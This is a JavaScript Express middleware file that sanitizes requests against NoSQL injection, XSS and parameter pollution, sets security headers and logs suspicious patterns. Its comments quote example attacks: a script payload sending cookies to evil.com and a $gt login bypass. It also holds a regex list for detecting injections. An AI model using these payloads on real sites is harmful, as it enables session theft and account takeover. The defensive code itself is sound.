import mongoSanitize from 'express-mongo-sanitize';
import xss from 'xss';
import hpp from 'hpp';

// ── 1. NoSQL Injection Prevention ──────────────────────────────────────────
// Strips $-prefixed keys like { "$gt": "" } from body/query/params.
// Example attack blocked: POST /login { "email": {"$gt":""}, "password":{"$gt":""} }
export const noSqlSanitize = mongoSanitize({ replaceWith: '_', onSanitize: ({ req, key }) => {
  console.warn(`⚠️  NoSQL injection attempt blocked — IP: ${req.ip} | Key: ${key}`);
}});

// ── 2. XSS Prevention ──────────────────────────────────────────────────────
// Encodes HTML entities in all string values before they reach controllers.
// Example attack blocked: title = "<script>document.location='https://evil.com?c='+document.cookie</script>"
const sanitizeValue = (val) => {
  if (typeof val === 'string') return xss(val.trim());
  if (Array.isArray(val)) return val.map(sanitizeValue);
  if (val && typeof val === 'object' && !(val instanceof Date) && !(val instanceof Buffer))
    return Object.fromEntries(Object.entries(val).map(([k, v]) => [k, sanitizeValue(v)]));
  return val;
};

export const xssSanitizer = (req, res, next) => {
  if (req.body)   req.body   = sanitizeValue(req.body);
  if (req.query)  req.query  = sanitizeValue(req.query);
  if (req.params) req.params = sanitizeValue(req.params);
  next();
};

// ── 3. HTTP Parameter Pollution Prevention ─────────────────────────────────
// Keeps only the last value when a param appears multiple times.
// Example attack blocked: GET /research?status=pending&status=approved
export const paramPollution = hpp({
  whitelist: ['sort', 'fields', 'page', 'limit'] // allow arrays only for these
});

// ── 4. Additional Security Response Headers ────────────────────────────────
// These prevent clickjacking, MIME sniffing, and unwanted browser features.
export const securityHeaders = (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');          // Prevent MIME sniffing
  res.setHeader('X-Frame-Options', 'DENY');                    // Prevent clickjacking
  res.setHeader('X-XSS-Protection', '1; mode=block');          // Legacy XSS filter
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');
  next();
};

// ── 5. Suspicious Pattern Logger ───────────────────────────────────────────
// Logs attacks for forensic analysis even after they've been sanitized above.
const PATTERNS = [/<script/i, /javascript:/i, /on\w+\s*=/i, /\$where/i, /eval\s*\(/i, /union\s+select/i];

export const suspiciousPatternLogger = (req, res, next) => {
  try {
    const payload = JSON.stringify({ b: req.body, q: req.query });
    if (PATTERNS.some(p => p.test(payload))) {
      console.warn(`🔴 Suspicious request | IP: ${req.ip} | Path: ${req.path} | UA: ${req.get('user-agent')?.substring(0,80)}`);
    }
  } catch {}
  next();
};